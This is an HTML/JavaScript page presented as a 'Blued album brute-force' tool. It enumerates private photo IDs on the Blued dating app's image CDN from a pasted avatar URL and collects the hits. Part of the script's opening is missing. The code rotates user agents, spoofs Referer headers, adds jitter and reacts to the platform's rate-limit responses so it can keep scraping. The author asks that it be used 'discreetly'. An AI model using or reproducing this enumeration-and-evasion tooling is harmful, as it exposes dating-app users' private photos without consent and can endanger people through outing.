<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Blued相册爆破v1.0</title>
    <!-- 防盗链配置 移动端加固 -->
    <meta name="referrer" content="no-referrer">
    <meta name="referrer" content="never">
    <style>
        :root {
            --primary-green: #34c759;
            --primary-green-active: #30d158;
            --danger-red: #ff453a;
            --accent-blue: #007aff;
            --warning-orange: #ff9500;
            --bg-blur-base: rgba(255, 255, 255, 0.08);
            --bg-blur-hover: rgba(255, 255, 255, 0.12);
            --bg-blur-deep: rgba(255, 255, 255, 0.06);
            --border-blur: rgba(255, 255, 255, 0.1);
            --blur-strong: 12px;
            --blur-weak: 8px;
            --radius-container: 20px;
            --radius-card: 16px;
            --radius-btn: 16px;
            --radius-input: 12px;
            --radius-thumb: 8px;
            --text-white: #ffffff;
            --text-gray-1: #aaaaaa;
            --text-gray-2: #999999;
            --text-gray-3: #666666;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
            -webkit-overflow-scrolling: touch;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: #000000;
            color: var(--text-white);
            min-height: 100vh;
            padding: 20px 16px;
            max-width: 100vw;
            overflow-x: hidden;
        }
        .container {
            max-width: 100%;
            margin: 0 auto;
            background: var(--bg-blur-base);
            backdrop-filter: blur(var(--blur-strong));
            -webkit-backdrop-filter: blur(var(--blur-strong));
            border-radius: var(--radius-container);
            border: 1px solid var(--border-blur);
            padding: 20px 16px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .header {
            text-align: center;
        }
        .header h1 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 6px;
        }
        .header .subtitle {
            color: var(--text-gray-2);
            font-size: 13px;
        }
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .input-item {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .input-item label {
            color: var(--text-gray-1);
            font-size: 14px;
            font-weight: 500;
        }
        .input-item input {
            width: 100%;
            padding: 12px 14px;
            border-radius: var(--radius-input);
            background: var(--bg-blur-deep);
            backdrop-filter: blur(var(--blur-weak));
            -webkit-backdrop-filter: blur(var(--blur-weak));
            border: 1px solid var(--border-blur);
            color: var(--text-white);
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
            -webkit-user-select: text;
            user-select: text;
            caret-color: var(--accent-blue);
        }
        .input-item input:focus {
            border-color: rgba(255, 255, 255, 0.25);
        }
        .input-row {
            display: flex;
            gap: 10px;
        }
        .input-row .input-item {
            flex: 1;
        }
        .mode-group {
            display: flex;
            gap: 8px;
        }
        .mode-btn {
            flex: 1;
            padding: 12px 6px;
            border-radius: var(--radius-input);
            background: var(--bg-blur-deep);
            backdrop-filter: blur(var(--blur-weak));
            -webkit-backdrop-filter: blur(var(--blur-weak));
            border: 1px solid var(--border-blur);
            color: var(--text-white);
            font-size: 14px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }
        .mode-btn.active {
            background: var(--bg-blur-hover);
            border-color: rgba(255, 255, 255, 0.25);
        }
        .mode-btn.retry-ready {
            background: rgba(0, 122, 255, 0.2);
            border-color: rgba(0, 122, 255, 0.4);
        }
        .mode-btn.retry-running {
            background: rgba(255, 149, 0, 0.2);
            border-color: rgba(255, 149, 0, 0.4);
        }
        .mode-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        .mode-btn small {
            display: block;
            font-size: 11px;
            color: var(--text-gray-2);
            margin-top: 2px;
        }
        .action-btns {
            display: flex;
            gap: 10px;
        }
        .start-btn {
            flex: 2;
            padding: 16px 0;
            border-radius: var(--radius-btn);
            background: var(--primary-green);
            border: none;
            color: var(--text-white);
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .start-btn:active {
            background: var(--primary-green-active);
            transform: scale(0.98);
        }
        .start-btn:disabled {
            background: var(--bg-blur-deep);
            color: var(--text-gray-3);
            cursor: not-allowed;
            transform: none;
        }
        .stop-btn {
            flex: 1;
            padding: 16px 0;
            border-radius: var(--radius-btn);
            background: var(--bg-blur-base);
            backdrop-filter: blur(var(--blur-weak));
            -webkit-backdrop-filter: blur(var(--blur-weak));
            border: 1px solid var(--border-blur);
            color: var(--text-white);
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .stop-btn:active:not(:disabled) {
            background: var(--bg-blur-hover);
            transform: scale(0.98);
        }
        .stop-btn:disabled {
            color: var(--text-gray-3);
            cursor: not-allowed;
            transform: none;
        }
        .progress-wrap {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .progress-bar {
            width: 100%;
            height: 8px;
            background: var(--bg-blur-deep);
            border-radius: 999px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #34d399, #22c55e);
            border-radius: 999px;
            transition: width 0.1s linear;
        }
        .stat-row {
            display: flex;
            flex-wrap: wrap;
            font-size: 12px;
            font-weight: 500;
            color: var(--text-gray-1);
            gap: 12px;
            width: 100%;
        }
        .stat-row div {
            flex-shrink: 0;
        }
        .stat-row span {
            color: var(--text-white);
        }
        .eta-row {
            color: var(--text-gray-1);
            font-size: 12px;
            font-weight: 500;
        }
        .eta-row span {
            color: var(--text-white);
        }
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .section-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text-white);
            margin: 0;
        }
        .export-btn {
            padding: 6px 10px;
            border-radius: 8px;
            background: var(--accent-blue);
            border: none;
            color: var(--text-white);
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
        }
        .export-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            background: var(--text-gray-3);
        }
        .export-btn:active:not(:disabled) {
            opacity: 0.8;
            transform: scale(0.98);
        }

        /* 预览区 完全保留之前的修复 无修改 */
        .preview-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(70px, 1fr));
            gap: 8px;
            padding: 16px 12px;
            background: var(--bg-blur-deep);
            backdrop-filter: blur(var(--blur-weak));
            -webkit-backdrop-filter: blur(var(--blur-weak));
            border-radius: var(--radius-card);
            border: 1px solid var(--border-blur);
            min-height: 100px;
            max-height: 220px;
            overflow-y: auto;
            scroll-behavior: smooth;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: thin;
            scrollbar-color: rgba(255,255,255,0.2) transparent;
        }
        .preview-grid::-webkit-scrollbar {
            width: 4px;
        }
        .preview-grid::-webkit-scrollbar-track {
            background: transparent;
        }
        .preview-grid::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.2);
            border-radius: 999px;
        }
        /* 缩略图 全兼容正方形 */
        .preview-thumb {
            position: relative;
            width: 100%;
            padding-top: 100%;
            border-radius: var(--radius-thumb);
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-color: var(--bg-blur-base);
            cursor: pointer;
            transition: transform 0.2s;
            border: 1px solid var(--border-blur);
        }
        .preview-thumb:active {
            transform: scale(0.95);
        }
        .empty-tip {
            grid-column: 1 / -1;
            text-align: center;
            color: var(--text-gray-3);
            font-size: 14px;
            padding: 30px 0;
        }

        /* 日志区 无修改 */
        #log {
            width: 100%;
            height: 300px;
            background: var(--bg-blur-deep);
            backdrop-filter: blur(var(--blur-weak));
            -webkit-backdrop-filter: blur(var(--blur-weak));
            border-radius: var(--radius-card);
            border: 1px solid var(--border-blur);
            padding: 14px;
            color: var(--text-gray-1);
            font-size: 12px;
            font-weight: 500;
            overflow-y: auto;
            scroll-behavior: smooth;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: thin;
            scrollbar-color: rgba(255,255,255,0.2) transparent;
            font-family: "SF Mono", "Menlo", monospace;
            word-break: break-all;
        }
        #log::-webkit-scrollbar {
            width: 4px;
        }
        #log::-webkit-scrollbar-track {
            background: transparent;
        }
        #log::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.2);
            border-radius: 999px;
        }
        .log-line {
            margin: 5px 0;
            font-size: 12px;
        }
        .log-success {
            color: var(--primary-green);
        }
        .log-error {
            color: var(--danger-red);
        }
        .log-warning {
            color: var(--warning-orange);
        }
        .log-info {
            color: var(--accent-blue);
        }
        .footer {
            text-align: center;
            color: var(--text-gray-3);
            font-size: 11px;
        }
    </style>
</head>

<div class="container">
    <div class="header">
        <h1>Blued相册爆破v2.0</h1>
        <div class="subtitle">作者：狐小卿 | 请低调使用</div>
    </div>
    <div class="input-group">
        <div class="input-item">
            <label>此处粘贴任意头像URL</label>
            <input type="text" id="urlVal" placeholder="https://www.bldimg.com/userfiles/...">
        </div>
        <div class="input-row">
            <div class="input-item">
                <label>起始ID</label>
                <input type="number" id="startId" placeholder="0">
            </div>
            <div class="input-item">
                <label>结束ID</label>
                <input type="number" id="endId" placeholder="99999">
            </div>
        </div>
    </div>
    <div class="mode-group">
        <button class="mode-btn active" data-mode="full">
            全局统配<br><small>不漏图</small>
        </button>
        <button class="mode-btn" data-mode="split">
            批量探测<br><small>速度快</small>
        </button>
        <button class="mode-btn" id="retryBtn" disabled>
            失败重试<br><small>待扫描</small>
        </button>
    </div>
    <div class="action-btns">
        <button class="start-btn" id="startBtn">开始爆破</button>
        <button class="stop-btn" id="stopBtn" disabled>停止</button>
    </div>
    <div class="progress-wrap">
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="stat-row">
            <div>已处理：<span id="processedCount">0</span></div>
            <div>成功：<span id="successCount">0</span></div>
            <div>失败：<span id="failureCount">0</span></div>
            <div>速度：<span id="speed">0.0</span>/s</div>
        </div>
        <div class="eta-row">ETA：<span id="eta">999</span>s | 命中率：<span id="hitRate">0.0</span>%</div>
    </div>
    <div class="section">
        <div class="section-header">
            <h2 class="section-title">成功图片预览</h2>
            <button class="export-btn" id="exportBtn" disabled>导出URL TXT</button>
        </div>
        <div class="preview-grid" id="previewGrid">
            <div class="empty-tip">暂无成功图片，开始爆破后将在此处展示</div>
        </div>
    </div>
    <div class="section">
        <div class="section-title">运行日志</div>
        <div id="log"></div>
    </div>
    <div class="footer">© 2026 狐小卿</div>
</div>

    retryBtn: document.getElementById('retryBtn'),
    previewGrid: document.getElementById('previewGrid'),
    urlVal: document.getElementById('urlVal'),
    startId: document.getElementById('startId'),
    endId: document.getElementById('endId'),
    exportBtn: document.getElementById('exportBtn')
};

// 工具函数
const getRandomUA = () => UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
const randomJitter = () => new Promise(resolve => setTimeout(resolve, Math.random() * (CONFIG.JITTER_MAX - CONFIG.JITTER_MIN) + CONFIG.JITTER_MIN));
const extractFilePath = (url) => {
    const reg = /\/userfiles\/(\d+\/\d+\/\d+)\/\d+/;
    const res = url.match(reg);
    return res ? res[1] : null;
};
const buildUrls = (id) => {
    const urls = [];
    const suffixList = SUFFIX_CONFIG[state.mode];
    const shuffledDomains = [...DOMAIN_LIST].sort(() => Math.random() - 0.5);
    for (const suf of suffixList) {
        for (const dom of shuffledDomains) {
            urls.push(`${dom}/userfiles/${state.filePath}/${id}${suf}`);
        }
    }
    return urls;
};

// 图片有效性校验 100%对齐Python
const isValidImage = async (arrayBuffer) => {
    if (!arrayBuffer || arrayBuffer.byteLength < 80) return false;
    const uint8 = new Uint8Array(arrayBuffer);
    const head = uint8.slice(0, 32);
    if (head[0] === 0x89 && head[1] === 0x50 && head[2] === 0x4E && head[3] === 0x47) return true;
    if (head[0] === 0xFF && head[1] === 0xD8 && head[2] === 0xFF) return true;
    if ((head[0] === 0x47 && head[1] === 0x49 && head[2] === 0x46 && head[3] === 0x38 && (head[4] === 0x37 || head[4] === 0x39) && head[5] === 0x61)) return true;
    if (uint8.slice(8, 12).every((v, i) => v === [0x57, 0x45, 0x42, 0x50][i])) return true;
    return false;
};

// 信号量实现
class Semaphore {
    constructor(limit) {
        this.limit = limit;
        this.count = 0;
        this.queue = [];
    }
    async acquire() {
        if (this.count < this.limit) {
            this.count++;
            return Promise.resolve();
        }
        return new Promise(resolve => this.queue.push(resolve));
    }
    release() {
        this.count--;
        if (this.queue.length > 0) {
            this.count++;
            const resolve = this.queue.shift();
            resolve();
        }
    }
}

// 单域名信号量初始化
const initDomainSemaphores = () => {
    state.domainSemaphores = {};
    for (const [domain, limit] of Object.entries(BASE_DOMAIN_LIMITS)) {
        state.domainSemaphores[domain] = new Semaphore(limit);
    }
};

// 动态并发风控逻辑 100%对齐Python
const adjustConcurrencyOnRisk = async () => {
    state.continuousRisk567++;
    state.continuousNormalRequest = 0;
    if (state.continuousRisk567 >= CONFIG.RISK_TRIGGER_COUNT) {
        const newConcurrency = Math.max(Math.floor(state.currentConcurrency * 0.6), 20);
        if (newConcurrency !== state.currentConcurrency) {
            state.currentConcurrency = newConcurrency;
            for (const [domain, sem] of Object.entries(state.domainSemaphores)) {
                const newLimit = Math.max(Math.floor(BASE_DOMAIN_LIMITS[domain] * 0.6), 10);
                state.domainSemaphores[domain] = new Semaphore(newLimit);
            }
            addWarningLog(`[567风控触发] 已自动降低并发至: ${state.currentConcurrency}`);
        }
        state.continuousRisk567 = 0;
    }
};
const adjustConcurrencyOnNormal = async () => {
    state.continuousNormalRequest++;
    state.continuousRisk567 = 0;
    if (state.continuousNormalRequest >= CONFIG.RISK_RECOVER_COUNT) {
        const newConcurrency = Math.min(Math.floor(state.currentConcurrency * 1.4), CONFIG.BASE_CONCURRENCY);
        if (newConcurrency !== state.currentConcurrency) {
            state.currentConcurrency = newConcurrency;
            for (const [domain, sem] of Object.entries(state.domainSemaphores)) {
                const newLimit = Math.min(Math.floor(BASE_DOMAIN_LIMITS[domain] * 1.4), BASE_DOMAIN_LIMITS[domain]);
                state.domainSemaphores[domain] = new Semaphore(newLimit);
            }
            addSuccessLog(`[风控缓解] 已自动恢复并发至: ${state.currentConcurrency}`);
        }
        state.continuousNormalRequest = 0;
    }
};

// 567二次探测逻辑 100%对齐Python
const secondProbe = async (url, host) => {
    let lastResponse = null;
    for (let retryTimes = 0; retryTimes < CONFIG.MAX_567_RETRY; retryTimes++) {
        const delay = CONFIG.RETRY_DELAY_BASE * (retryTimes + 1);
        await new Promise(resolve => setTimeout(resolve, delay * (0.8 + Math.random() * 0.4)));
        const headers = {
            "Host": host,
            "User-Agent": getRandomUA(),
            "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": `https://${host}/`,
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        };
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), CONFIG.REQUEST_TIMEOUT);
            const res = await fetch(url, {
                headers,
                signal: controller.signal,
                mode: "cors",
                cache: "no-cache",
                redirect: CONFIG.FOLLOW_REDIRECTS ? "follow" : "manual"
            });
            clearTimeout(timeout);
            lastResponse = res;
            if (res.status !== 567) break;
        } catch {
            continue;
        }
    }
    return lastResponse;
};

// ====================== 核心修复：缩略图渲染+单击跳转 ======================
const addPreviewThumb = (originUrl, id) => {
    // 先移除空提示
    const emptyTip = dom.previewGrid.querySelector('.empty-tip');
    if (emptyTip) emptyTip.remove();
    
    // 去重判断
    const isExist = state.successfulUrls.includes(originUrl);
    if (isExist) return;

    // 创建缩略图元素
    const thumb = document.createElement('div');
    thumb.className = "preview-thumb";
    thumb.title = `ID${id} 点击查看原图`;
    // 直接使用原始URL渲染背景图
    thumb.style.backgroundImage = `url("${originUrl}")`;
    
    // 【修复】单击跳转 — WKWebView 兼容，直接跳转而非新窗口
    thumb.addEventListener('click', () => {
        window.location.href = originUrl;
    }, { passive: true });
    
    // 仅保留加载失败报错 移除所有成功提示
    thumb.onerror = () => {
        thumb.style.backgroundColor = "var(--bg-blur-base)";
        addErrorLog(`ID${id} 预览图加载失败`);
    };

    // 追加到预览区
    dom.previewGrid.appendChild(thumb);

    // 启用导出按钮
    dom.exportBtn.disabled = false;
};

// 导出URL TXT函数 无修改
const exportUrlsToTxt = () => {
    const uniqueUrls = [...new Set(state.successfulUrls)].sort((a, b) => {
        const idA = a.match(/\/(\d+)(?:!|$)/)?.[1] || 0;
        const idB = b.match(/\/(\d+)(?:!|$)/)?.[1] || 0;
        return idA - idB;
    });

    if (uniqueUrls.length === 0) {
        addErrorLog("导出失败：暂无成功图片URL");
        return;
    }

    const txtContent = uniqueUrls.join('\n');
    const blob = new Blob([txtContent], { type: 'text/plain;charset=utf-8' });
    const downloadUrl = URL.createObjectURL(blob);

    const aTag = document.createElement('a');
    const timestamp = new Date().toLocaleString().replace(/[/:\s]/g, '-');
    aTag.download = `Blued_成功图片_URL_${timestamp}.txt`;
    aTag.href = downloadUrl;
    aTag.style.display = 'none';

    document.body.appendChild(aTag);
    aTag.click();
    document.body.removeChild(aTag);
    URL.revokeObjectURL(downloadUrl);

    addSuccessLog(`✅ 导出成功！共导出 ${uniqueUrls.length} 条图片URL`);
};

// 重试按钮状态控制 无修改
const updateRetryBtnState = (status, text, smallText) => {
    dom.retryBtn.className = "mode-btn";
    dom.retryBtn.innerHTML = `${text}<br><small>${smallText}</small>`;
    
    switch(status) {
        case "disabled":
            dom.retryBtn.disabled = true;
            break;
        case "ready":
            dom.retryBtn.disabled = false;
            dom.retryBtn.classList.add("retry-ready");
            break;
        case "running":
            dom.retryBtn.disabled = true;
            dom.retryBtn.classList.add("retry-running");
            break;
        case "done":
            dom.retryBtn.disabled = true;
            break;
    }
};

// 重置函数 无修改
const resetAllState = () => {
    state.processed = 0;
    state.successCount = 0;
    state.failureCount = 0;
    state.taskStartTime = 0;
    state.continuousRisk567 = 0;
    state.continuousNormalRequest = 0;
    state.currentConcurrency = CONFIG.BASE_CONCURRENCY;
    state.successfulUrls = [];
    state.failedUrls = [];
    state.retryUrlList = [];
    state.isRetrying = false;
    state.retryProcessed = 0;
    state.retryTotal = 0;
    state.retrySuccessCount = 0;
    state.retryFailCount = 0;

    dom.progressFill.style.width = "0%";
    dom.processedCount.innerText = "0";
    dom.successCount.innerText = "0";
    dom.failureCount.innerText = "0";
    dom.speed.innerText = "0.0";
    dom.eta.innerText = "999";
    dom.hitRate.innerText = "0.0";
    dom.log.innerHTML = "";
    dom.previewGrid.innerHTML = '<div class="empty-tip">暂无成功图片，开始爆破后将在此处展示</div>';
    dom.exportBtn.disabled = true;

    if (state.progressTimer) {
        clearInterval(state.progressTimer);
        state.progressTimer = null;
    }
    initDomainSemaphores();
    updateRetryBtnState("disabled", "二次重试", "待扫描");
};

// 核心扫描逻辑 无修改
const checkUrlValid = async (url) => {
    const host = url.split("/")[2];
    const hostSem = state.domainSemaphores[host];
    if (!hostSem) return { valid: false, url, status: 'Error' };

    await hostSem.acquire();
    await randomJitter();

    const headers = {
        "Host": host,
        "User-Agent": getRandomUA(),
        "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": `https://${host}/`,
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    };

    let res = null;
    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), CONFIG.REQUEST_TIMEOUT);
        res = await fetch(url, {
            headers,
            signal: controller.signal,
            mode: "cors",
            cache: "no-cache",
            redirect: CONFIG.FOLLOW_REDIRECTS ? "follow" : "manual"
        });
        clearTimeout(timeout);

        if (res.status === 567) {
            await adjustConcurrencyOnRisk();
            res = await secondProbe(url, host);
        }

        if (![403, 429, 500, 503, 567].includes(res?.status || 500)) {
            await adjustConcurrencyOnNormal();
        }

        if (res?.ok) {
            const arrayBuffer = await res.arrayBuffer();
            const isValid = await isValidImage(arrayBuffer);
            if (isValid) {
                hostSem.release();
                return { valid: true, url, status: res.status };
            }
        }

        hostSem.release();
        return { valid: false, url, status: res?.status || 'Error' };

    } catch (err) {
        hostSem.release();
        return { valid: false, url, status: err.name };
    }
};

// ====================== 修复：成功日志仅打印ID 移除URL ======================
const scanSingleId = async (id, sem) => {
    if (!state.isRunning) return;
    await sem.acquire();

    const urls = buildUrls(id);
    let isSuccess = false;
    let successUrl = "";
    const tempFail = [];

    for (const url of urls) {
        if (!state.isRunning) break;
        const { valid, status } = await checkUrlValid(url);
        if (valid) {
            isSuccess = true;
            successUrl = url;
            break;
        } else {
            tempFail.push({ status, url });
        }
    }

    state.processed++;
    if (isSuccess) {
        state.successCount++;
        // 【修复】成功日志仅打印ID 彻底移除URL
        addSuccessLog(`✅ 成功: ID${id}`);
        // 先渲染预览图 再去重入库
        addPreviewThumb(successUrl, id);
        if (!state.successfulUrls.includes(successUrl)) {
            state.successfulUrls.push(successUrl);
        }
    } else {
        state.failureCount++;
        state.failedUrls.push(...tempFail);
        tempFail.forEach(item => state.retryUrlList.push(item.url));
    }

    sem.release();
};

// 并发池控制 无修改
const runConcurrentPool = async (tasks, limit) => {
    const sem = new Semaphore(limit);
    const taskPromises = tasks.map(task => task(sem));
    await Promise.all(taskPromises);
};

// 进度条刷新 无修改
const startProgressRefresh = () => {
    state.progressTimer = setInterval(() => {
        if (!state.isRunning && !state.isRetrying) return;

        let pct, processed, total, speed, eta, successCount, failureCount, hitRate;
        if (state.isRetrying) {
            pct = state.retryTotal > 0 ? (state.retryProcessed / state.retryTotal) * 100 : 0;
            processed = state.retryProcessed;
            total = state.retryTotal;
            successCount = state.retrySuccessCount;
            failureCount = state.retryFailCount;
            const used = (Date.now() - state.retryStartTime) / 1000;
            speed = used >= 1 ? (processed / used) : 0;
            const remain = total - processed;
            eta = (speed >= 0.05 && remain > 0 && used >= 1) ? Math.round(remain / speed) : 999;
            hitRate = processed > 0 ? (successCount / processed * 100) : 0;
        } else {
            pct = state.totalTask > 0 ? (state.processed / state.totalTask) * 100 : 0;
            processed = state.processed;
            total = state.totalTask;
            successCount = state.successCount;
            failureCount = state.failureCount;
            const used = (Date.now() - state.taskStartTime) / 1000;
            speed = used >= 1 ? (processed / used) : 0;
            const remain = total - processed;
            eta = (speed >= 0.05 && remain > 0 && used >= 1) ? Math.round(remain / speed) : 999;
            hitRate = processed > 0 ? (successCount / processed * 100) : 0;
        }

        dom.progressFill.style.width = `${pct}%`;
        dom.processedCount.innerText = processed;
        dom.successCount.innerText = successCount;
        dom.failureCount.innerText = failureCount;
        dom.speed.innerText = speed.toFixed(1);
        dom.eta.innerText = eta;
        dom.hitRate.innerText = hitRate.toFixed(1);

    }, CONFIG.REFRESH_INTERVAL);
};

// ====================== 修复：重试成功日志仅打印ID 移除URL ======================
const retrySingleUrl = async (url, sem) => {
    if (!state.isRetrying) return;
    await sem.acquire();

    const { valid } = await checkUrlValid(url);
    state.retryProcessed++;

    if (valid) {
        state.retrySuccessCount++;
        const idMatch = url.match(/\/(\d+)(?:!|$)/);
        const id = idMatch ? idMatch[1] : '未知';
        // 【修复】重试成功日志仅打印ID 彻底移除URL
        addSuccessLog(`✅ 重试成功: ID${id}`);
        addPreviewThumb(url, id);
        if (!state.successfulUrls.includes(url)) {
            state.successfulUrls.push(url);
        }
    } else {
        state.retryFailCount++;
    }

    sem.release();
};

const runRetry = async () => {
    const uniqueRetryUrls = [...new Set(state.retryUrlList)];
    state.retryTotal = uniqueRetryUrls.length;

    if (state.retryTotal === 0) {
        addWarningLog("无需要重试的链接");
        return;
    }

    updateRetryBtnState("running", "重试中", "运行中");
    state.isRetrying = true;
    state.retryProcessed = 0;
    state.retrySuccessCount = 0;
    state.retryFailCount = 0;
    state.retryStartTime = Date.now();
    dom.startBtn.disabled = true;
    dom.stopBtn.disabled = false;

    addInfoLog(`开始批量重试失败链路，重试数量：${state.retryTotal}`);
    startProgressRefresh();

    const sem = new Semaphore(CONFIG.RETRY_CONCURRENCY);
    const tasks = uniqueRetryUrls.map(url => async (sem) => retrySingleUrl(url, sem));
    await runConcurrentPool(tasks, CONFIG.RETRY_CONCURRENCY);

    state.isRetrying = false;
    if (state.progressTimer) {
        clearInterval(state.progressTimer);
        state.progressTimer = null;
    }

    const used = (Date.now() - state.retryStartTime) / 1000;
    addInfoLog(`全部重试执行完毕`);
    addInfoLog(`重试统计：总请求${state.retryTotal} | 成功${state.retrySuccessCount} | 失败${state.retryFailCount} | 耗时${used.toFixed(2)}s`);

    const totalUsed = (Date.now() - state.taskStartTime) / 1000;
    addInfoLog(`\n任务结束总统计`);
    addSuccessLog(`累计成功：${state.successCount + state.retrySuccessCount}`);
    addErrorLog(`累计失败：${state.failureCount}`);
    addInfoLog(`总耗时：${totalUsed.toFixed(2)} 秒`);

    dom.startBtn.disabled = false;
    dom.stopBtn.disabled = true;
    updateRetryBtnState("done", "二次重试", "已完成");
};

// 主扫描业务逻辑 无修改
const startScan = async () => {
    resetAllState();
    state.isRunning = true;
    dom.startBtn.disabled = true;
    dom.stopBtn.disabled = false;

    const url = dom.urlVal.value.trim();
    state.startId = parseInt(dom.startId.value) || 0;
    state.endId = parseInt(dom.endId.value) || 0;
    state.filePath = extractFilePath(url);

    if (!state.filePath) {
        addErrorLog("错误！请检查URL格式是否正确粘贴");
        state.isRunning = false;
        dom.startBtn.disabled = false;
        dom.stopBtn.disabled = true;
        return;
    }
    if (state.endId < state.startId) {
        addErrorLog("错误！结束ID必须大于等于起始ID");
        state.isRunning = false;
        dom.startBtn.disabled = false;
        dom.stopBtn.disabled = true;
        return;
    }

    state.totalTask = state.endId - state.startId + 1;
    state.taskStartTime = Date.now();
    addInfoLog("开始爆破");
    addInfoLog(`扫描范围: ID${state.startId} ~ ID${state.endId} | 总任务数: ${state.totalTask}`);
    addInfoLog(`爆破模式: ${state.mode === "full" ? "全局统配" : "批量探测"}`);

    startProgressRefresh();

    const tasks = [];
    for (let i = state.startId; i <= state.endId; i++) {
        tasks.push(async (sem) => scanSingleId(i, sem));
    }

    await runConcurrentPool(tasks, state.currentConcurrency);

    state.isRunning = false;
    if (state.progressTimer) {
        clearInterval(state.progressTimer);
        state.progressTimer = null;
    }

    const usedTime = (Date.now() - state.taskStartTime) / 1000;
    dom.progressFill.style.width = "100%";
    addInfoLog(`扫描结束 | 总耗时: ${usedTime.toFixed(2)}s | 成功: ${state.successCount} | 失败: ${state.failureCount}`);

    const uniqueRetryUrls = [...new Set(state.retryUrlList)];
    if (uniqueRetryUrls.length > 0) {
        updateRetryBtnState("ready", "二次重试", `可重试(${uniqueRetryUrls.length})`);
    } else {
        updateRetryBtnState("disabled", "二次重试", "无失败链接");
    }

    dom.startBtn.disabled = false;
    dom.stopBtn.disabled = true;
};

// 停止扫描逻辑 无修改
const stopScan = () => {
    state.isRunning = false;
    state.isRetrying = false;
    if (state.progressTimer) {
        clearInterval(state.progressTimer);
        state.progressTimer = null;
    }
    addWarningLog("扫描/重试已手动停止");
    dom.startBtn.disabled = false;
    dom.stopBtn.disabled = true;
    const uniqueRetryUrls = [...new Set(state.retryUrlList)];
    if (uniqueRetryUrls.length > 0 && !state.isRetrying) {
        updateRetryBtnState("ready", "二次重试", `可重试(${uniqueRetryUrls.length})`);
    } else {
        updateRetryBtnState("disabled", "二次重试", "已停止");
    }
};

// 事件绑定 无修改
document.querySelectorAll('.mode-btn[data-mode]').forEach(btn => {
    btn.onclick = () => {
        document.querySelectorAll('.mode-btn[data-mode]').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        state.mode = btn.dataset.mode;
    };
});

dom.retryBtn.onclick = runRetry;
dom.startBtn.onclick = startScan;
dom.stopBtn.onclick = stopScan;
dom.exportBtn.onclick = exportUrlsToTxt;

// 移动端输入框兼容 无修改
document.onkeydown = (e) => {
    const activeElement = document.activeElement;
    if (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA') {
        return;
    }
};
const allInputs = document.querySelectorAll('input');
allInputs.forEach(input => {
    input.onkeydown = (e) => {
        e.stopPropagation();
    };
});
